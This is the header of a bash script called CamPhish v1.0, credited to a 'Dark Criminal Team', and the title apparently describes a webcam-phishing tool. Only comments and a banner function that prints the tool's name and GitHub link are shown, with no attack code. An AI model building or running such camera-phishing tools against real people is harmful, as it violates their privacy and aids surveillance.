#!/bin/bash
# CamPhish v1.0
# Powered by Dark Criminal Team
# Credits goes to Dark Criminal [github.com/dark-criminal/]

banner() {
echo -e "\e[91m --- Camera Phish Current Version 1.0 | Coded By: Dark Criminal Team ---\e[0m"
...
echo -e " -\e[90m(https://github.com/dark-criminal)\e[0m\n"
